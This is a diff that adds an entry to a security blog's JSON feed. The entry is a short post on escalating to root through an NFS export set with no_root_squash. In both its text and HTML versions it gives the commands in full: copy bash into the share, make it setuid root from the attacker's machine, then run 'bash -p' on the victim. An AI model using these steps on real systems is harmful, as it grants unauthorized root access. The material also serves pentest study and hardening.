@@ -17,6 +17,30 @@
 "items": [
     
         {
+            "id": "https://mvineza.github.io/spindel/2022/01/29/nfs-no-root-squash",
+            "title": "NFS no_root_squash",
+            "summary": "NFS no_root_squash",
+            "content_text": "OverviewIf an NFS export contains no_root_squash option, attacker can mount that export on his machine and modify any file acting as root user.Steps  Mount share on attacker machine  Inside victim machine, copy /bin/bash# e.g /home/james is an NFS exportcd /home/jamescp /bin/bash .  From attacker machinecd /mntsudo chown root:root bashsudo chmod u+s bash  Back to victim machine,./bash -p# enjoy!",
+            "content_html": "<h2 id=\"overview\">Overview</h2><p>If an NFS export contains <code class=\"language-plaintext highlighter-rouge\">no_root_squash</code> option, attacker can mount that export on his machine and modify any file acting as root user.</p><h2 id=\"steps\">Steps</h2><ul>  <li>Mount share on attacker machine</li>  <li>Inside victim machine, copy <code class=\"language-plaintext highlighter-rouge\">/bin/bash</code></li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># e.g /home/james is an NFS export</span><span class=\"nb\">cd</span> /home/james<span class=\"nb\">cp</span> /bin/bash <span class=\"nb\">.</span></code></pre></div></div><ul>  <li>From attacker machine</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nb\">cd</span> /mnt<span class=\"nb\">sudo chown </span>root:root bash<span class=\"nb\">sudo chmod </span>u+s bash</code></pre></div></div><ul>  <li>Back to victim machine,</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>./bash <span class=\"nt\">-p</span><span class=\"c\"># enjoy!</span></code></pre></div></div>",
+            "url": "https://mvineza.github.io/spindel/2022/01/29/nfs-no-root-squash",
+            
+            
+            
+            "tags": ["linux","privesc","nfs"],
+            
+            "date_published": "2022-01-29T00:00:00+08:00",
+            "date_modified": "2022-01-29T00:00:00+08:00",
+            
+                "author":  {
+                "name": "spindel",
+                "url": null,
+                "avatar": null
+                }
+                
+            
+        },
+    
+        {
             "id": "https://mvineza.github.io/spindel/2022/01/24/zipped-lnk-files-over-smb",
             "title": "Zipped LNK files over SMB",
             "summary": "Zipped LNK files over SMB",
